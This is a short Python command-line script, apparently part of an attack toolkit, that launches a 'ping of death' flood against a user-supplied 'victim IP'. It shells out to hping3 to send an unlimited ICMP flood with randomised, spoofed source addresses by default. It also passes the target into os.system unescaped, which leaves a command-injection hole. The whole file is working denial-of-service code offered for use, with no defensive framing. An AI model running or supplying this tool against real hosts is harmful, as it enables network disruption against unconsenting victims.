import click
import os


@click.command("ping_of_death", help="attack vimim with ping of death attack")
@click.option("--target", prompt="victim IP addr", help="victim to attack.")
@click.option("--ddos", default=True, help="enable ddos simulate")
@click.option("--num", default=-1, help="number of packages, default = -1 (flood)")
@click.option("--payload", default=120, help="size of payload, default = 120")
@click.pass_context
def ping_of_death(ctx, target, payload, ddos, num):
    click.echo(
        "\n\n-------------------- ping of death flood attack ---------------------\n"
    )
    os.system(
        "$(which hping3) %s -q --icmp -n -d %s -p 80 %s %s"
        % (
            target,
            payload,
            "--flood" if num == -1 else "-c %s" % (num),
            "--rand-source" if ddos else "",
        )
    )
    click.echo("End of ping of death attack. Total %d packets sent.\n" % (num))


if __name__ == "__main__":
    ping_of_death()
